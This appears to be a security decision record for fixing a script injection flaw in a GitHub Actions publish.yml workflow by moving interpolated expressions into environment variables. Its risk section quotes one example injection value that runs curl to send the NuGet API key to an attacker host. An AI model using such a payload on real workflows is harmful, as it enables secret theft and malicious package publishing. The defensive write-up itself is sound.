# Decision: Fix Script Injection in publish.yml

**Author:** Sark (Security Engineer)
**Date:** 2025-07-25
**Status:** Implemented
**Phase:** 1 (Immediate) — Item 1.2 from §9 5-Phase Roadmap
**Approved by:** Bruno Capuano

## Context

The `publish.yml` workflow had a script injection vulnerability (CWE-78) in the "Determine version" step. Direct `${{ github.event.inputs.version }}` and `${{ github.ref }}` interpolation inside `run:` bash blocks allowed arbitrary command execution via crafted `workflow_dispatch` inputs.

**Severity:** P0 — attacker with repository write access could exfiltrate the NuGet API key or publish malicious packages.

## Decision

Replace all `${{ }}` expression interpolations inside `run:` shell blocks with environment variables set in `env:` blocks. GitHub Actions evaluates `env:` values before shell execution, preventing injection.

## Changes

| Step | Before (vulnerable) | After (safe) |
|---|---|---|
| Determine version | `${{ github.ref }}`, `${{ github.event.inputs.version }}` in bash | `env: GIT_REF`, `env: INPUT_VERSION` |
| Build | `${{ steps.version.outputs.version }}` in bash | `env: PACKAGE_VERSION` |
| Pack | `${{ steps.version.outputs.version }}` in bash | `env: PACKAGE_VERSION` |
| Push to NuGet | `${{ steps.nuget-login.outputs.NUGET_API_KEY }}` in bash | `env: NUGET_API_KEY` |

## Audit Scope

All 8 workflow files in `.github/workflows/` were reviewed. No other `${{ }}` interpolations in `run:` blocks were found. Other workflows use `actions/github-script` (JavaScript context) or have expressions only in safe YAML positions (`with:`, `if:`, `github-token:`).

## Risk Assessment

- **Before:** A contributor with `workflow_dispatch` permission could inject shell commands (e.g., `1.0.0"; curl attacker.com/steal?key=$NUGET_API_KEY; echo "`) to exfiltrate secrets.
- **After:** User input is bound to environment variables. Shell metacharacters in the input are treated as literal string values by bash.
- **Regression risk:** None — the workflow logic is functionally identical. Only the mechanism for passing values into bash changed.
